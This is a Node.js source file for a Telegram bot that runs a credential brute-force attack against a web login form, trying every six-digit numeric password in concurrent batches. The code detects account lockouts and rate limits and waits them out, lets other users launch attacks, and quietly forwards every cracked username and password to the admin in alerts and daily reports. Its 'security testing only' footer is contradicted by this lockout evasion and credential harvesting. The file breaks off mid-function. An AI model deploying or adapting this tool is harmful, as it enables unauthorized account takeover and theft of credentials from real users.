require("dotenv").config();
const TelegramBot = require("node-telegram-bot-api");
const axios = require("axios");
const cheerio = require("cheerio");
const { wrapper } = require("axios-cookiejar-support");
const { CookieJar } = require("tough-cookie");
const express = require("express");

const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const LOGIN_URL = "http://localhost:3000/Login.aspx";
const PORT = process.env.PORT || 3000;

const START = 0;
const END = 999999;
const CONCURRENT_REQUESTS = 10;
const BATCH_DELAY = 100;
const LOCK_RETRY_DELAY = 5 * 60 * 1000;
const DAILY_REPORT_HOUR = 0;

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
const app = express();

const runningTasks = new Map();

let publicAccessEnabled = false;
const authorizedUsers = new Set();
const usedUsers = new Set();

let dailyLog = {
  date: new Date().toISOString().split("T")[0],
  accessRequests: [],
  newUsers: [],
  successfulLogins: [],
  completedTasks: [],
  receivedMessages: [],
  addedUsers: [],
  revokedUsers: [],
};

let botStats = {
  startTime: Date.now(),
  totalRequests: 0,
  totalSuccess: 0,
  totalFailed: 0,
};

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

function logReceivedMessage(msg) {
  const logEntry = {
    time: new Date().toISOString(),
    userId: msg.chat.id,
    username: msg.from.username || "no_username",
    firstName: msg.from.first_name || "Unknown",
    message: msg.text || "non-text message",
  };
  dailyLog.receivedMessages.push(logEntry);
}

async function sendDailyReport() {
  let report = `📊 *Daily Report*\n`;
  report += `📅 Date: ${dailyLog.date}\n`;
  report += `⏰ Time: ${new Date().toISOString()}\n\n`;

  if (dailyLog.accessRequests.length > 0) {
    report += `🔔 *Access Requests:* (${dailyLog.accessRequests.length})\n`;
    dailyLog.accessRequests.forEach((req, index) => {
      if (index < 10) {
        report += `   ${index + 1}. \`${req.userId}\` - ${req.name} - ${
          req.time
        }\n`;
      }
    });
    if (dailyLog.accessRequests.length > 10) {
      report += `   ... and ${dailyLog.accessRequests.length - 10} more\n`;
    }
    report += "\n";
  }

  if (dailyLog.newUsers.length > 0) {
    report += `✅ *New Users:* (${dailyLog.newUsers.length})\n`;
    dailyLog.newUsers.forEach((user, index) => {
      if (index < 10) {
        report += `   ${index + 1}. \`${user.userId}\` - ${user.username} - ${
          user.time
        }\n`;
      }
    });
    if (dailyLog.newUsers.length > 10) {
      report += `   ... and ${dailyLog.newUsers.length - 10} more\n`;
    }
    report += "\n";
  }

  if (dailyLog.successfulLogins.length > 0) {
    report += `🎉 *Found Passwords:* (${dailyLog.successfulLogins.length})\n`;
    dailyLog.successfulLogins.forEach((login, index) => {
      report += `   ${index + 1}. Username: \`${login.username}\` - Pass: \`${
        login.password
      }\` - ${login.time}\n`;
    });
    report += "\n";
  }

  if (dailyLog.completedTasks.length > 0) {
    report += `✅ *Completed Tasks:* (${dailyLog.completedTasks.length})\n`;
    dailyLog.completedTasks.forEach((task, index) => {
      if (index < 10) {
        report += `   ${index + 1}. \`${task.username}\` - Success: ${
          task.success
        } - ${task.time}\n`;
      }
    });
    if (dailyLog.completedTasks.length > 10) {
      report += `   ... and ${dailyLog.completedTasks.length - 10} more\n`;
    }
    report += "\n";
  }

  if (dailyLog.addedUsers.length > 0) {
    report += `➕ *Authorized Users:* (${dailyLog.addedUsers.length})\n`;
    dailyLog.addedUsers.forEach((user, index) => {
      report += `   ${index + 1}. \`${user.userId}\` - ${user.time}\n`;
    });
    report += "\n";
  }

  if (dailyLog.revokedUsers.length > 0) {
    report += `➖ *Revoked Users:* (${dailyLog.revokedUsers.length})\n`;
    dailyLog.revokedUsers.forEach((user, index) => {
      report += `   ${index + 1}. \`${user.userId}\` - ${user.time}\n`;
    });
    report += "\n";
  }

  if (dailyLog.receivedMessages.length > 0) {
    report += `💬 *Received Messages:* (${dailyLog.receivedMessages.length})\n`;
    const uniqueUsers = new Set(dailyLog.receivedMessages.map((m) => m.userId));
    report += `👥 Unique Users: ${uniqueUsers.size}\n`;

    const lastMessages = dailyLog.receivedMessages.slice(-5);
    lastMessages.forEach((msg, index) => {
      const text =
        msg.message.length > 30
          ? msg.message.substring(0, 30) + "..."
          : msg.message;
      report += `   ${index + 1}. \`${msg.userId}\` - ${text} - ${msg.time}\n`;
    });
    report += "\n";
  }

  if (
    dailyLog.accessRequests.length === 0 &&
    dailyLog.newUsers.length === 0 &&
    dailyLog.successfulLogins.length === 0 &&
    dailyLog.completedTasks.length === 0 &&
    dailyLog.receivedMessages.length === 0
  ) {
    report += `💤 *No activity today*\n`;
  }

  await sendTelegram(report);

  dailyLog = {
    date: new Date().toISOString().split("T")[0],
    accessRequests: [],
    newUsers: [],
    successfulLogins: [],
    completedTasks: [],
    receivedMessages: [],
    addedUsers: [],
    revokedUsers: [],
  };
}

function setupDailyReport() {
  const checkTime = () => {
    const now = new Date();
    if (now.getHours() === DAILY_REPORT_HOUR && now.getMinutes() === 0) {
      sendDailyReport();
    }
  };

  setInterval(checkTime, 60 * 1000);
}

async function sendTelegram(message) {
  try {
    await bot.sendMessage(ADMIN_CHAT_ID, message, { parse_mode: "Markdown" });
  } catch (error) {
    console.error("Error sending telegram:", error.message);
  }
}

function hasAccess(chatId) {
  const chatIdStr = chatId.toString();

  if (chatIdStr === ADMIN_CHAT_ID) {
    return { allowed: true, isAdmin: true };
  }

  if (authorizedUsers.has(chatIdStr)) {
    if (usedUsers.has(chatIdStr)) {
      return { allowed: false, isAdmin: false, reason: "already_used" };
    }
    return { allowed: true, isAdmin: false, isAuthorized: true };
  }

  if (publicAccessEnabled) {
    if (usedUsers.has(chatIdStr)) {
      return { allowed: false, isAdmin: false, reason: "already_used" };
    }
    return { allowed: true, isAdmin: false, isPublic: true };
  }

  return { allowed: false, isAdmin: false, reason: "no_access" };
}

async function tryLogin(username, password) {
  const jar = new CookieJar();
  const client = wrapper(axios.create({ jar, timeout: 10000 }));

  try {
    const loginPageResponse = await client.get(LOGIN_URL);
    const $ = cheerio.load(loginPageResponse.data);

    const formData = new URLSearchParams();
    $('input[type="hidden"]').each((i, elem) => {
      const name = $(elem).attr("name");
      const value = $(elem).attr("value");
      if (name && value) {
        formData.append(name, value);
      }
    });

    formData.append("txtUserName", username);
    formData.append("txtPassword", password);
    formData.append("LoginButton", "Login");

    const loginResponse = await client.post(LOGIN_URL, formData, {
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        Referer: LOGIN_URL,
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      },
      maxRedirects: 0,
      validateStatus: (status) => status >= 200 && status < 400,
    });

    const $response = cheerio.load(loginResponse.data);
    const errorMessage = $response("#lblMessage").text().trim();
    const loginError = $response(".error-message").text().trim();
    const validationError = $response(".validation-summary-errors")
      .text()
      .trim();
    const lockedMessage = $response("#lblErrorForm").text().trim();

    botStats.totalRequests++;

    if (
      lockedMessage &&
      (lockedMessage.includes("قفل") ||
        lockedMessage.includes("locked") ||
        lockedMessage.includes("lock"))
    ) {
      console.log(`🔒 LOCKED - Username: ${username} | Password: ${password}`);
      return {
        success: false,
        message: `LOCKED`,
        password,
        isLocked: true,
      };
    }

    if (errorMessage || loginError || validationError) {
      botStats.totalFailed++;
      console.log(`❌ FAILED - Username: ${username} | Password: ${password}`);
      return {
        success: false,
        message: errorMessage || loginError || validationError || "Invalid",
        password,
      };
    }

    if (loginResponse.status === 302 || loginResponse.status === 301) {
      botStats.totalSuccess++;
      console.log(
        `✅ SUCCESS - Username: ${username} | Password: ${password} | Status: Redirected`
      );
      return { success: true, message: "Redirected", password };
    }

    if ($response('input[name="txtUserName"]').length > 0) {
      botStats.totalFailed++;
      console.log(`❌ FAILED - Username: ${username} | Password: ${password}`);
      return { success: false, message: "Invalid", password };
    }

    botStats.totalSuccess++;
    console.log(
      `✅ SUCCESS - Username: ${username} | Password: ${password} | Status: Logged in`
    );
    return { success: true, message: "Logged in", password };
  } catch (error) {
    botStats.totalRequests++;

    if (error.response && error.response.status === 302) {
      botStats.totalSuccess++;
      console.log(
        `✅ SUCCESS - Username: ${username} | Password: ${password} | Status: Redirect`
      );
      return { success: true, message: "Redirect", password };
    }

    if (error.code === "ECONNABORTED" || error.message.includes("timeout")) {
      botStats.totalFailed++;
      console.log(`⏱️ TIMEOUT - Username: ${username} | Password: ${password}`);
      return { success: false, message: "TIMEOUT", password };
    }

    if (error.response && error.response.status === 429) {
      console.log(
        `🔒 RATE LIMITED - Username: ${username} | Password: ${password}`
      );
      return {
        success: false,
        message: "Rate limited",
        password,
        isLocked: true,
      };
    }

    botStats.totalFailed++;
    console.log(
      `❌ ERROR - Username: ${username} | Password: ${password} | ${error.message}`
    );
    return { success: false, message: error.message, password };
  }
}

async function checkIfStillLocked(username) {
  console.log(`🔍 Checking if ${username} is still locked...`);
  const testPassword = "999999";
  const result = await tryLogin(username, testPassword);
  return result.isLocked || false;
}

async function bruteForceUsername(username, chatId) {
  if (runningTasks.has(username) && runningTasks.get(username).isRunning) {
    await bot.sendMessage(
      chatId,
      `⚠️ \`${username}\` is already being tested!`,
      { parse_mode: "Markdown" }
    );
    return;
  }

  const task = {
    isRunning: true,
    username: username,
    chatId: chatId,
    successCount: 0,
    failedCount: 0,
    processedCount: 0,
    startTime: Date.now(),
    lastUpdate: Date.now(),
  };

  runningTasks.set(username, task);

  const startMessage =
    `🚀 *Test Started*\n\n` +
    `👤 Username: \`${username}\`\n` +
    `🔑 Range: ${START.toString().padStart(6, "0")} - ${END.toString().padStart(
      6,
      "0"
    )}\n` +
    `⚡ Concurrent: ${CONCURRENT_REQUESTS}`;

  await bot.sendMessage(chatId, startMessage, { parse_mode: "Markdown" });

  console.log(`\n🚀 ===== TEST STARTED =====`);
  console.log(`👤 Username: ${username}`);
  console.log(`🔑 Range: ${START} - ${END}`);
  console.log(`⚡ Concurrent: ${CONCURRENT_REQUESTS}`);
  console.log(`===========================\n`);

  if (chatId.toString() !== ADMIN_CHAT_ID) {
    await sendTelegram(
      `🔔 *New User Started Test*\n\n` +
        `👤 Username: \`${username}\`\n` +
        `🆔 User ID: \`${chatId}\``
    );
  }

  for (let i = START; i <= END; i += CONCURRENT_REQUESTS) {
    if (!runningTasks.has(username) || !runningTasks.get(username).isRunning) {
      await bot.sendMessage(
        chatId,
        `🛑 *Test Stopped*\n\n👤 Username: \`${username}\``,
        { parse_mode: "Markdown" }
      );
      console.log(`🛑 Test stopped for ${username}`);
      runningTasks.delete(username);
      return;
    }

    const batch = [];

    for (let j = 0; j < CONCURRENT_REQUESTS && i + j <= END; j++) {
      const password = (i + j).toString().padStart(6, "0");
      batch.push(tryLogin(username, password));
    }

    const results = await Promise.all(batch);
    let batchHasLock = false;

    for (const result of results) {
      task.processedCount++;

      if (result.isLocked) {
        batchHasLock = true;

        const lockMessage =
          `🔒 *Account Locked!*\n\n` +
          `👤 Username: \`${username}\`\n` +
          `🔑 Password: \`${result.password}\`\n` +
          `⏰ Waiting ${LOCK_RETRY_DELAY / 1000 / 60} minutes...`;

        await bot.sendMessage(chatId, lockMessage, { parse_mode: "Markdown" });
        console.log(`\n🔒 ===== ACCOUNT LOCKED =====`);
        console.log(`👤 Username: ${username}`);
        console.log(`🔑 Password: ${result.password}`);
        console.log(`⏰ Waiting ${LOCK_RETRY_DELAY / 1000 / 60} minutes...`);
        console.log(`==============================\n`);

        await sleep(LOCK_RETRY_DELAY);

        let stillLocked = await checkIfStillLocked(username);

        while (stillLocked && runningTasks.get(username)?.isRunning) {
          await bot.sendMessage(
            chatId,
            `⏰ Still locked: \`${username}\`\nWaiting ${
              LOCK_RETRY_DELAY / 1000 / 60
            } more minutes...`,
            { parse_mode: "Markdown" }
          );
          console.log(
            `⏰ Still locked: ${username} - Waiting ${
              LOCK_RETRY_DELAY / 1000 / 60
            } more minutes...`
          );
          await sleep(LOCK_RETRY_DELAY);
          stillLocked = await checkIfStillLocked(username);
        }

        if (runningTasks.get(username)?.isRunning) {
          await bot.sendMessage(
            chatId,
            `✅ Lock released: \`${username}\` - Continuing...`,
            { parse_mode: "Markdown" }
          );
          console.log(`✅ Lock released for ${username} - Continuing...\n`);
          i -= CONCURRENT_REQUESTS;
        }
        break;
      }

      if (result.success) {
        task.successCount++;

        const successMessage =
          `🎉 *Password Found!*\n\n` +
          `👤 Username: \`${username}\`\n` +
          `🔑 Password: \`${result.password}\`\n` +
          `✅ ${result.message}`;

        await bot.sendMessage(chatId, successMessage, {
          parse_mode: "Markdown",
        });

        console.log(`\n🎉 ===== PASSWORD FOUND! =====`);
        console.log(`👤 Username: ${username}`);
        console.log(`🔑 Password: ${result.password}`);
        console.log(`✅ Status: ${result.message}`);
        console.log(`==============================\n`);

        dailyLog.successfulLogins.push({
          username: username,
          password: result.password,
          userId: chatId,
          time: new Date().toISOString(),
        });

        if (chatId.toString() !== ADMIN_CHAT_ID) {
          await sendTelegram(successMessage + `\n\n🆔 User ID: \`${chatId}\``);
        }
      } else {
        task.failedCount++;
      }
    }

    if (!batchHasLock && i + CONCURRENT_REQUESTS <= END) {
      await sleep(BATCH_DELAY);
    }
  }

  const totalTime = ((Date.now() - task.startTime) / 1000 / 60).toFixed(2);

  const finalMessage =
    `✅ *Test Completed*\n\n` +
    `👤 Username: \`${username}\`\n` +
    `📊 Total: ${task.processedCount}\n` +
    `✅ Success: ${task.successCount}\n` +
    `❌ Failed: ${task.failedCount}\n` +
    `⏱️ Time: ${totalTime} min`;

  await bot.sendMessage(chatId, finalMessage, { parse_mode: "Markdown" });

  console.log(`\n✅ ===== TEST COMPLETED =====`);
  console.log(`👤 Username: ${username}`);
  console.log(`📊 Total Tested: ${task.processedCount}`);
  console.log(`✅ Success: ${task.successCount}`);
  console.log(`❌ Failed: ${task.failedCount}`);
  console.log(`⏱️ Time: ${totalTime} minutes`);
  console.log(`=============================\n`);

  dailyLog.completedTasks.push({
    username: username,
    success: task.successCount,
    userId: chatId,
    time: new Date().toISOString(),
  });

  if (chatId.toString() !== ADMIN_CHAT_ID) {
    await sendTelegram(finalMessage + `\n\n🆔 User ID: \`${chatId}\``);
  }

  runningTasks.delete(username);
}

app.use(express.json());

app.get("/", (req, res) => {
  const uptime = Math.floor((Date.now() - botStats.startTime) / 1000);
  const hours = Math.floor(uptime / 3600);
  const minutes = Math.floor((uptime % 3600) / 60);
  const seconds = uptime % 60;

  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Telegram Brute Force Bot</title>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <style>
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
        }
        body {
          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          min-height: 100vh;
          padding: 20px;
        }
        .container {
          max-width: 1000px;
          margin: 50px auto;
          background: white;
          padding: 40px;
          border-radius: 20px;
          box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        h1 {
          color: #2c3e50;
          border-bottom: 4px solid #667eea;
          padding-bottom: 15px;
          margin-bottom: 30px;
          font-size: 32px;
        }
        .status {
          display: inline-block;
          padding: 8px 20px;
          background: linear-gradient(135deg, #2ecc71, #27ae60);
          color: white;
          border-radius: 25px;
          font-weight: bold;
          margin-bottom: 20px;
          box-shadow: 0 4px 15px rgba(46, 204, 113, 0.4);
        }
        .stats {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
          gap: 20px;
          margin: 30px 0;
        }
        .stat-box {
          background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
          padding: 20px;
          border-radius: 15px;
          border-left: 5px solid #667eea;
          transition: transform 0.3s, box-shadow 0.3s;
        }
        .stat-box:hover {
          transform: translateY(-5px);
          box-shadow: 0 10px 25px rgba(0,0,0,0.1);
        }
        .stat-label {
          color: #7f8c8d;
          font-size: 14px;
          margin-bottom: 8px;
          font-weight: 600;
        }
        .stat-value {
          color: #2c3e50;
          font-size: 28px;
          font-weight: bold;
        }
        .footer {
          margin-top: 40px;
          padding-top: 20px;
          border-top: 2px solid #ecf0f1;
          text-align: center;
          color: #7f8c8d;
          font-size: 14px;
        }
        .endpoint {
          background: #ecf0f1;
          padding: 15px;
          border-radius: 8px;
          margin: 10px 0;
          font-family: 'Courier New', monospace;
        }
        .endpoint-title {
          font-weight: bold;
          color: #2c3e50;
          margin-bottom: 10px;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <h1>🤖 Telegram Brute Force Bot</h1>
        <p><span class="status">✅ Running</span></p>
        
        <div class="stats">
          <div class="stat-box">
            <div class="stat-label">⏱️ Uptime</div>
            <div class="stat-value">${hours}h ${minutes}m ${seconds}s</div>
          </div>
          
          <div class="stat-box">
            <div class="stat-label">🔄 Running Tasks</div>
            <div class="stat-value">${runningTasks.size}</div>
          </div>
          
          <div class="stat-box">
            <div class="stat-label">📊 Total Requests</div>
            <div class="stat-value">${botStats.totalRequests.toLocaleString()}</div>
          </div>
          
          <div class="stat-box">
            <div class="stat-label">✅ Success Rate</div>
            <div class="stat-value">${
              botStats.totalRequests > 0
                ? (
                    (botStats.totalSuccess / botStats.totalRequests) *
                    100
                  ).toFixed(2)
                : 0
            }%</div>
          </div>
          
          <div class="stat-box">
            <div class="stat-label">👥 Authorized Users</div>
            <div class="stat-value">${authorizedUsers.size}</div>
          </div>
          
          <div class="stat-box">
            <div class="stat-label">📝 Used Users</div>
            <div class="stat-value">${usedUsers.size}</div>
          </div>
          
          <div class="stat-box">
            <div class="stat-label">🔓 Public Access</div>
            <div class="stat-value">${
              publicAccessEnabled ? "✅ ON" : "❌ OFF"
            }</div>
          </div>
          
          <div class="stat-box">
            <div class="stat-label">📅 Today's Messages</div>
            <div class="stat-value">${dailyLog.receivedMessages.length}</div>
          </div>
        </div>
        
        <div class="endpoint-title">📡 API Endpoints:</div>
        <div class="endpoint">GET /health - Health check</div>
        <div class="endpoint">GET /stats - Statistics JSON</div>
        <div class="endpoint">GET /ping - Simple ping</div>
        
        <div class="footer">
          <p>🌐 Server running on port ${PORT}</p>
          <p>🕐 Last updated: ${new Date().toUTCString()}</p>
          <p>💻 Made for security testing purposes only</p>
        </div>
      </div>
    </body>
    </html>
  `);
});

app.get("/health", (req, res) => {
  res.json({
    status: "ok",
    uptime: Math.floor((Date.now() - botStats.startTime) / 1000),
    timestamp: new Date().toISOString(),
    bot: "running",
  });
});

app.get("/stats", (req, res) => {
  res.json({
    botStats: {
      ...botStats,
      uptime: Math.floor((Date.now() - botStats.startTime) / 1000),
    },
    runningTasks: runningTasks.size,
    authorizedUsers: authorizedUsers.size,
    usedUsers: usedUsers.size,
    publicAccessEnabled: publicAccessEnabled,
    dailyLog: {
      date: dailyLog.date,
      accessRequests: dailyLog.accessRequests.length,
      newUsers: dailyLog.newUsers.length,
      successfulLogins: dailyLog.successfulLogins.length,
      completedTasks: dailyLog.completedTasks.length,
      receivedMessages: dailyLog.receivedMessages.length,
      addedUsers: dailyLog.addedUsers.length,
      revokedUsers: dailyLog.revokedUsers.length,
    },
  });
});

app.get("/ping", (req, res) => {
  res.send("pong");
});

bot.on("message", (msg) => {
  logReceivedMessage(msg);
});

bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const access = hasAccess(chatId);

  if (!access.allowed) {
    let errorMsg = "⛔ You don't have access to this bot!\n\n";

    if (access.reason === "already_used") {
      errorMsg += "💡 You have already used this bot.\n";
      errorMsg += "Each user can only use it once.";
    } else if (access.reason === "no_access") {
      errorMsg += "💡 Please ask admin to grant you access.\n";
      errorMsg += `🆔 Your ID: \`${chatId}\``;
    }

    bot.sendMessage(chatId, errorMsg, { parse_mode: "Markdown" });

    if (access.reason === "no_access") {
      dailyLog.accessRequests.push({
        userId: chatId,
        name: msg.from.first_name || "Unknown",
        username: msg.from.username || "no_username",
        time: new Date().toISOString(),
      });

      await sendTelegram(
        `🔔 *New Access Request*\n\n` +
          `🆔 User ID: \`${chatId}\`\n` +
          `👤 Name: ${msg.from.first_name || "Unknown"}\n` +
          `📝 Username: ${
            msg.from.username ? "@" + msg.from.username : "None"
          }\n\n` +
          `💡 To grant access:\n\`/access ${chatId}\``
      );
    }

    return;
  }

  const welcomeMessage = `
🤖 *Brute Force Test Bot*

📋 *Main Commands:*

/add \`username\` - Add and start test
/stop \`username\` - Stop specific test
/list - List running tests
/status - Overall status
/help - Help guide

*Example:*
\`/add 0123456789\`
\`/stop 0123456789\`

${
  access.isAdmin
    ? `\n🔧 *Admin Commands:*\n/allaccess - Toggle public access\n/access <user_id> - Grant user access\n/revoke <user_id> - Revoke user access\n/users - List users\n/todaylog - Today's report\n/resetall - Reset all`
    : `\n⚠️ *Note:* You can only use this bot once!`
}
  `;

  bot.sendMessage(chatId, welcomeMessage, { parse_mode: "Markdown" });
});

bot.onText(/\/add (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const access = hasAccess(chatId);

  if (!access.allowed) {
    let errorMsg = "⛔ You don't have access to this bot!\n\n";

    if (access.reason === "already_used") {
      errorMsg += "💡 You have already used this bot.";
    } else if (access.reason === "no_access") {
      errorMsg += `💡 Please request access from admin.\n🆔 Your ID: \`${chatId}\``;
    }

    bot.sendMessage(chatId, errorMsg, { parse_mode: "Markdown" });
    return;
  }

  const username = match[1].trim();

  if (!username) {
    bot.sendMessage(
      chatId,
      "❌ Please enter username!\n\nExample: `/add 0123456789`",
      {
        parse_mode: "Markdown",
      }
    );
    return;
  }

  if (!access.isAdmin) {
    usedUsers.add(chatId.toString());

    dailyLog.newUsers.push({
      userId: chatId,
      username: msg.from.username || "no_username",
      targetUsername: username,
      time: new Date().toISOString(),
    });

    bot.sendMessage(
      chatId,
      `✅ Starting test for \`${username}\`...\n\n⚠️ You can no longer use this bot.`,
      {
        parse_mode: "Markdown",
      }
    );
  } else {
    bot.sendMessage(chatId, `✅ Starting test for \`${username}\`...`, {
      parse_mode: "Markdown",
    });
  }

  bruteForceUsername(username, chatId).catch((err) => {
    bot.sendMessage(chatId, `❌ Error with \`${username}\`: ${err.message}`, {
      parse_mode: "Markdown",
    });
  });
});

bot.onText(/\/stop (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const access = hasAccess(chatId);
  const username = match[1].trim();

  if (!username) {
    bot.sendMessage(
      chatId,
      "❌ Please enter username!\n\nExample: `/stop 0123456789`",
      {
        parse_mode: "Markdown",
      }
    );
    return;
  }

  if (!runningTasks.has(username)) {
    bot.sendMessage(chatId, `⚠️ \`${username}\` is not running!`, {
      parse_mode: "Markdown",
    });
    return;
  }

  const task = runningTasks.get(username);

  if (
    !access.isAdmin &&
    task.chatId &&
    task.chatId.toString() !== chatId.toString()
  ) {
    bot.sendMessage(chatId, `⛔ You cannot stop other users' tests!`);
    return;
  }

  task.isRunning = false;

  bot.sendMessage(chatId, `🛑 Stopping \`${username}\`...`, {
    parse_mode: "Markdown",
  });
});

bot.onText(/\/list/, async (msg) => {
  const chatId = msg.chat.id;
  const access = hasAccess(chatId);

  if (runningTasks.size === 0) {
    bot.sendMessage(chatId, "💤 No tests are running.");
    return;
  }

  let message = `📋 *Running Tests:* (${runningTasks.size})\n\n`;
  let hasAnyTask = false;

  runningTasks.forEach((task, username) => {
    const elapsed = ((Date.now() - task.startTime) / 1000 / 60).toFixed(2);
    const progress = ((task.processedCount / (END - START + 1)) * 100).toFixed(
      1
    );

    if (
      access.isAdmin ||
      (task.chatId && task.chatId.toString() === chatId.toString())
    ) {
      hasAnyTask = true;
      message += `👤 \`${username}\`\n`;
      message += `   📊 Progress: ${progress}%\n`;
      message += `   ✅ Success: ${task.successCount}\n`;
      message += `   ⏱️ Time: ${elapsed}m\n`;
      if (access.isAdmin && task.chatId) {
        message += `   🆔 User: \`${task.chatId}\`\n`;
      }
      message += `\n`;
    }
  });

  if (!hasAnyTask) {
    bot.sendMessage(chatId, "💤 You have no running tests.");
    return;
  }

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

bot.onText(/\/status/, async (msg) => {
  const chatId = msg.chat.id;
  const access = hasAccess(chatId);

  const totalRunning = runningTasks.size;
  let totalSuccess = 0;
  let totalProcessed = 0;
  let myTasks = 0;

  runningTasks.forEach((task) => {
    totalSuccess += task.successCount;
    totalProcessed += task.processedCount;

    if (task.chatId && task.chatId.toString() === chatId.toString()) {
      myTasks++;
    }
  });

  const message = `
📊 *Bot Status*

⚡ Active Tests: ${totalRunning}
✅ Total Success: ${totalSuccess}
🔢 Total Processed: ${totalProcessed}
${!access.isAdmin ? `\n👤 Your Tasks: ${myTasks}` : ""}
${
  access.isAdmin
    ? `\n\n🔓 Public Access: ${
        publicAccessEnabled ? "✅ ON" : "❌ OFF"
      }\n👥 Authorized Users: ${authorizedUsers.size}\n📝 Used Users: ${
        usedUsers.size
      }\n\n📊 Today's Stats:\n   🔔 Requests: ${
        dailyLog.accessRequests.length
      }\n   ✅ New Users: ${dailyLog.newUsers.length}\n   🎉 Found Passwords: ${
        dailyLog.successfulLogins.length
      }\n   💬 Messages: ${dailyLog.receivedMessages.length}`
    : ""
}

💡 Use /list for details
  `;

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

bot.onText(/\/todaylog/, async (msg) => {
  const chatId = msg.chat.id;

  if (chatId.toString() !== ADMIN_CHAT_ID) {
    bot.sendMessage(chatId, "⛔ This command is admin only!");
    return;
  }

  let report = `📊 *Today's Report*\n`;
  report += `📅 Date: ${dailyLog.date}\n`;
  report += `⏰ Time: ${new Date().toISOString()}\n\n`;

  report += `📈 *Summary:*\n`;
  report += `🔔 Requests: ${dailyLog.accessRequests.length}\n`;
  report += `✅ New Users: ${dailyLog.newUsers.length}\n`;
  report += `🎉 Passwords: ${dailyLog.successfulLogins.length}\n`;
  report += `✅ Completed: ${dailyLog.completedTasks.length}\n`;
  report += `➕ Authorized: ${dailyLog.addedUsers.length}\n`;
  report += `➖ Revoked: ${dailyLog.revokedUsers.length}\n`;
  report += `💬 Messages: ${dailyLog.receivedMessages.length}\n\n`;

  if (dailyLog.accessRequests.length > 0) {
    report += `🔔 *Access Requests:*\n`;
    dailyLog.accessRequests.slice(-10).forEach((req, index) => {
      report += `   ${index + 1}. \`${req.userId}\` - ${req.name} - ${
        req.time
      }\n`;
    });
    report += "\n";
  }

  if (dailyLog.newUsers.length > 0) {
    report += `✅ *New Users:*\n`;
    dailyLog.newUsers.forEach((user, index) => {
      report += `   ${index + 1}. \`${user.userId}\` - ${
        user.targetUsername
      } - ${user.time}\n`;
    });
    report += "\n";
  }

  if (dailyLog.successfulLogins.length > 0) {
    report += `🎉 *Found Passwords:*\n`;
    dailyLog.successfulLogins.forEach((login, index) => {
      report += `   ${index + 1}. \`${login.username}\` - \`${
        login.password
      }\` - ${login.time}\n`;
    });
    report += "\n";
  }

  report += `💡 Full report sent daily at ${DAILY_REPORT_HOUR}:00`;

  bot.sendMessage(chatId, report, { parse_mode: "Markdown" });
});

bot.onText(/\/allaccess/, async (msg) => {
  const chatId = msg.chat.id;

  if (chatId.toString() !== ADMIN_CHAT_ID) {
    bot.sendMessage(chatId, "⛔ This command is admin only!");
    return;
  }

  publicAccessEnabled = !publicAccessEnabled;

  const status = publicAccessEnabled ? "✅ Enabled" : "❌ Disabled";
  const emoji = publicAccessEnabled ? "🔓" : "🔒";

  bot.sendMessage(
    chatId,
    `${emoji} *Public Access ${status}!*\n\n` +
      `${
        publicAccessEnabled
          ? "✅ Everyone can now use the bot (once per user)"
          : "❌ Only authorized users can use the bot"
      }\n\n` +
      `👥 Authorized Users: ${authorizedUsers.size}\n` +
      `📝 Used Users: ${usedUsers.size}`,
    { parse_mode: "Markdown" }
  );
});

bot.onText(/\/access (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (chatId.toString() !== ADMIN_CHAT_ID) {
    bot.sendMessage(chatId, "⛔ This command is admin only!");
    return;
  }

  const userId = match[1].trim();

  if (!userId) {
    bot.sendMessage(
      chatId,
      "❌ Please enter User ID!\n\nExample: `/access 123456789`",
      { parse_mode: "Markdown" }
    );
    return;
  }

  if (authorizedUsers.has(userId)) {
    bot.sendMessage(
      chatId,
      `⚠️ User \`${userId}\` is already authorized!\n\n` +
        `${usedUsers.has(userId) ? "✅ Already used" : "❌ Not used yet"}`,
      { parse_mode: "Markdown" }
    );
    return;
  }

  authorizedUsers.add(userId);

  dailyLog.addedUsers.push({
    userId: userId,
    time: new Date().toISOString(),
  });

  bot.sendMessage(
    chatId,
    `✅ *Access Granted!*\n\n` +
      `🆔 User ID: \`${userId}\`\n` +
      `👥 Total Authorized: ${authorizedUsers.size}\n\n` +
      `💡 User can use the bot once.`,
    { parse_mode: "Markdown" }
  );

  try {
    await bot.sendMessage(
      userId,
      `🎉 *Access Granted!*\n\n` +
        `✅ You can now use the bot.\n` +
        `⚠️ Note: You can only use it once!\n\n` +
        `💡 Use /start to begin.`,
      { parse_mode: "Markdown" }
    );
  } catch (error) {
    bot.sendMessage(
      chatId,
      `⚠️ Could not message user. They may not have started the bot yet.`,
      { parse_mode: "Markdown" }
    );
  }
});

bot.onText(/\/revoke (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (chatId.toString() !== ADMIN_CHAT_ID) {
    bot.sendMessage(chatId, "⛔ This command is admin only!");
    return;
  }

  const userId = match[1].trim();

  if (!userId) {
    bot.sendMessage(
      chatId,
      "❌ Please enter User ID!\n\nExample: `/revoke 123456789`",
      { parse_mode: "Markdown" }
    );
    return;
  }

  if (!authorizedUsers.has(userId)) {
    bot.sendMessage(chatId, `⚠️ User \`${userId}\` is not authorized!`, {
      parse_mode: "Markdown",
    });
    return;
  }

  authorizedUsers.delete(userId);

  dailyLog.revokedUsers.push({
    userId: userId,
